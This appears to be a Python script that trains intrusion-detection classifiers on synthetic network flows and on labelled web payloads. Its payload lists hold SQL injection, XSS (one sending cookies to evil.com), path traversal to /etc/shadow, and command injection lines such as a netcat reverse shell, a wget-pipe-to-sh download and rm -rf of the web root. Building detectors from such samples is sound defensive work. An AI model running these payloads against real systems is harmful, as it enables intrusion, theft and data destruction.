import os
import joblib
import numpy as np
import pandas as pd
from sklearn.ensemble import RandomForestClassifier, IsolationForest
from sklearn.preprocessing import StandardScaler
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import classification_report, accuracy_score

MODELS_DIR = os.path.join(os.path.dirname(__file__), "models")
os.makedirs(MODELS_DIR, exist_ok=True)

def generate_network_flow_dataset(num_samples: int = 5000):
    """
    Generates synthetic network flow dataset patterned after CIC-IDS2017 & NSL-KDD.
    Features: [packets_per_sec, bytes_per_sec, syn_ratio, unique_dst_ports, flow_duration, packet_entropy]
    """
    np.random.seed(42)
    data = []
    labels = []

    # 1. Normal Traffic (~60%)
    n_normal = int(num_samples * 0.60)
    for _ in range(n_normal):
        pps = np.random.uniform(5, 120)
        bps = pps * np.random.uniform(300, 1200)
        syn_ratio = np.random.uniform(0.01, 0.15)
        ports = np.random.randint(1, 3)
        duration = np.random.uniform(0.5, 30.0)
        entropy = np.random.uniform(0.2, 0.6)
        data.append([pps, bps, syn_ratio, ports, duration, entropy])
        labels.append("Normal")

    # 2. DDoS Volumetric Floods (~15%)
    n_ddos = int(num_samples * 0.15)
    for _ in range(n_ddos):
        pps = np.random.uniform(3000, 12000)
        bps = pps * np.random.uniform(500, 1500)
        syn_ratio = np.random.uniform(0.70, 0.99)
        ports = np.random.randint(1, 4)
        duration = np.random.uniform(0.1, 5.0)
        entropy = np.random.uniform(0.1, 0.4)
        data.append([pps, bps, syn_ratio, ports, duration, entropy])
        labels.append("DDoS")

    # 3. Port Scanning (~10%)
    n_scan = int(num_samples * 0.10)
    for _ in range(n_scan):
        pps = np.random.uniform(80, 500)
        bps = pps * np.random.uniform(40, 90)
        syn_ratio = np.random.uniform(0.60, 0.95)
        ports = np.random.randint(15, 200)
        duration = np.random.uniform(0.2, 3.0)
        entropy = np.random.uniform(0.3, 0.6)
        data.append([pps, bps, syn_ratio, ports, duration, entropy])
        labels.append("Port Scan")

    # 4. Data Exfiltration (~8%)
    n_exfil = int(num_samples * 0.08)
    for _ in range(n_exfil):
        pps = np.random.uniform(200, 800)
        bps = np.random.uniform(6_000_000, 25_000_000)
        syn_ratio = np.random.uniform(0.01, 0.10)
        ports = 1
        duration = np.random.uniform(2.0, 45.0)
        entropy = np.random.uniform(0.85, 0.99) # High entropy (compressed/encrypted archive)
        data.append([pps, bps, syn_ratio, ports, duration, entropy])
        labels.append("Data Exfiltration")

    # 5. Botnet C2 Beaconing (~7%)
    n_c2 = int(num_samples * 0.07)
    for _ in range(n_c2):
        pps = np.random.uniform(1, 10)
        bps = np.random.uniform(200, 1000)
        syn_ratio = np.random.uniform(0.05, 0.20)
        ports = 1
        duration = np.random.uniform(60.0, 300.0)
        entropy = np.random.uniform(0.5, 0.8)
        data.append([pps, bps, syn_ratio, ports, duration, entropy])
        labels.append("Botnet / C2 Beaconing")

    X = np.array(data)
    y = np.array(labels)
    return X, y

def generate_web_payload_dataset():
    """Generates synthetic labeled dataset for Web Application vulnerabilities."""
    samples = []
    labels = []

    # Normal queries
    normal_payloads = [
        "page=1&limit=20&sort=desc",
        "search=laptop+deals+under+500",
        "user_id=1052&action=view_profile",
        "category=electronics&brand=apple",
        "q=cybersecurity+threat+detector+guide",
        "lang=en-US&theme=dark",
        "filter=status:active&date=2026-09-18",
        "redirect_url=/dashboard/analytics",
        "cart_id=987123&coupon=SAVE20",
        "email=john.doe@enterprise.com",
        "product_id=5502&color=blue&size=M",
        "api_key=ak_live_89123891723891723",
        "sort_by=price_asc&in_stock=true",
        "view=summary&format=json",
        "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
    ] * 30
    for p in normal_payloads:
        samples.append(p)
        labels.append("Normal")

    # SQL Injection
    sqli_payloads = [
        "' OR '1'='1",
        "admin' --",
        "1' OR 1=1 --",
        "' UNION SELECT username, password FROM users --",
        "1; DROP TABLE users; --",
        "' UNION SELECT null, version(), null --",
        "1' AND 1=CONVERT(int, (SELECT @@version)) --",
        "admin'/*",
        "' OR 1=1#",
        "' OR 'x'='x",
        "1; EXEC xp_cmdshell('dir'); --",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --",
        "benchmark(10000000,MD5(1))",
        "' OR SLEEP(5) --",
        "1' UNION SELECT 1, column_name FROM information_schema.columns --"
    ] * 20
    for p in sqli_payloads:
        samples.append(p)
        labels.append("SQL Injection")

    # Cross-Site Scripting (XSS)
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "<svg onload=alert(1)>",
        "javascript:alert('Hacked')",
        "\"><script>fetch('http://evil.com/steal?c='+document.cookie)</script>",
        "<iframe src=\"javascript:alert('xss')\"></iframe>",
        "<body onload=alert('Pwned')>",
        "<input type=\"text\" autofocus onfocus=\"alert(1)\">",
        "<a href=\"javascript:alert(1)\">Click me</a>",
        "<video><source onerror=\"javascript:alert(1)\">",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<math><mtext><table><mglyph><style><!--</style><img src=1 onerror=alert(1)>"
    ] * 20
    for p in xss_payloads:
        samples.append(p)
        labels.append("Cross-Site Scripting (XSS)")

    # Path Traversal
    traversal_payloads = [
        "../../../../etc/passwd",
        "..%2f..%2f..%2fetc%2fshadow",
        "....//....//....//etc/passwd",
        "c:\\windows\\system32\\drivers\\etc\\hosts",
        "..\\..\\..\\windows\\win.ini",
        "/var/log/../../etc/passwd",
        "/home/app/../../../../etc/shadow",
        "page=../../../../proc/version",
        "file=..%5c..%5c..%5cboot.ini",
        "path=/etc/ssl/certs/../../etc/passwd"
    ] * 20
    for p in traversal_payloads:
        samples.append(p)
        labels.append("Path Traversal")

    # Command Injection
    cmd_payloads = [
        "; cat /etc/passwd",
        "| ls -la",
        "; nc -e /bin/sh 10.0.0.1 4444",
        "& whoami",
        "$(cat /etc/shadow)",
        "`ping -c 4 attacker.com`",
        "; wget http://evil.com/malware.sh -O- | sh",
        "& powershell -enc JABjAGwAaQBlAG4AdAA...",
        "| cmd.exe /c calc.exe",
        "; rm -rf /var/www/html/*"
    ] * 20
    for p in cmd_payloads:
        samples.append(p)
        labels.append("Command Injection")

    return samples, labels

def train_and_save_all():
    print("==================================================")
    print("[*] CYBERGUARD AI: Training Threat Detection Models")
    print("==================================================")

    # 1. Train Supervised Network Flow Classifier
    print("\n[1/3] Training Supervised Network Flow Classifier (Random Forest)...")
    X_flow, y_flow = generate_network_flow_dataset(6000)
    scaler_flow = StandardScaler()
    X_flow_scaled = scaler_flow.fit_transform(X_flow)

    rf_flow = RandomForestClassifier(n_estimators=100, max_depth=12, random_state=42, n_jobs=-1)
    rf_flow.fit(X_flow_scaled, y_flow)
    
    flow_acc = accuracy_score(y_flow, rf_flow.predict(X_flow_scaled))
    print(f"  --> Flow Classifier Accuracy: {flow_acc*100:.2f}%")
    
    joblib.dump({"model": rf_flow, "scaler": scaler_flow}, os.path.join(MODELS_DIR, "flow_model.joblib"))
    print(f"  --> Saved: {os.path.join(MODELS_DIR, 'flow_model.joblib')}")

    # 2. Train Unsupervised Zero-Day Anomaly Detector (Isolation Forest on Normal baseline)
    print("\n[2/3] Training Unsupervised Zero-Day Anomaly Detector (Isolation Forest)...")
    normal_indices = (y_flow == "Normal")
    X_normal = X_flow[normal_indices]
    
    scaler_anomaly = StandardScaler()
    X_normal_scaled = scaler_anomaly.fit_transform(X_normal)
    
    iso_forest = IsolationForest(n_estimators=120, contamination=0.03, random_state=42)
    iso_forest.fit(X_normal_scaled)
    
    joblib.dump({"model": iso_forest, "scaler": scaler_anomaly}, os.path.join(MODELS_DIR, "anomaly_model.joblib"))
    print(f"  --> Saved: {os.path.join(MODELS_DIR, 'anomaly_model.joblib')}")

    # 3. Train Web Payload NLP Classifier
    print("\n[3/3] Training Web Payload NLP Classifier (TF-IDF + Logistic Regression)...")
    text_samples, text_labels = generate_web_payload_dataset()
    
    vectorizer = TfidfVectorizer(ngram_range=(1, 3), analyzer="char_wb", max_features=2500)
    X_text_vec = vectorizer.fit_transform(text_samples)
    
    clf_payload = LogisticRegression(C=5.0, max_iter=500, random_state=42)
    clf_payload.fit(X_text_vec, text_labels)
    
    payload_acc = accuracy_score(text_labels, clf_payload.predict(X_text_vec))
    print(f"  --> Web Payload Classifier Accuracy: {payload_acc*100:.2f}%")
    
    joblib.dump({"model": clf_payload, "vectorizer": vectorizer}, os.path.join(MODELS_DIR, "payload_model.joblib"))
    print(f"  --> Saved: {os.path.join(MODELS_DIR, 'payload_model.joblib')}")

    print("\n==================================================")
    print("[SUCCESS] All AI/ML Models Trained and Serialized Successfully!")
    print("==================================================")

if __name__ == "__main__":
    train_and_save_all()
